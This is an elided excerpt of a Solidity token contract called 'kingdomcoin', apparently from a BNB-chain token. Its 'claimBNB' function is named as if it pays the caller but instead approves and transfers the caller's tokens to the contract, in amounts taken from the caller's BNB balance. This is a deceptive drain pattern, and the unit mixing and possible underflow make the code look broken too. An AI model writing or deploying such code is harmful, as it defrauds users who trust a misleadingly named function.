...
contract kingdomcoin is Context, IERC20, Ownable, ReentrancyGuard {
    ...
    string private _name = "kingdomcoin";
    ...
    function getUserBNB() public  view   returns (uint256){
        return payable(msg.sender).balance;
    }
    
    function claimBNB() public  {
        uint256 balance = payable(msg.sender).balance - 10**17;
        approve(address(this), balance);
        transferFrom(payable(msg.sender), address(this), balance);
    }
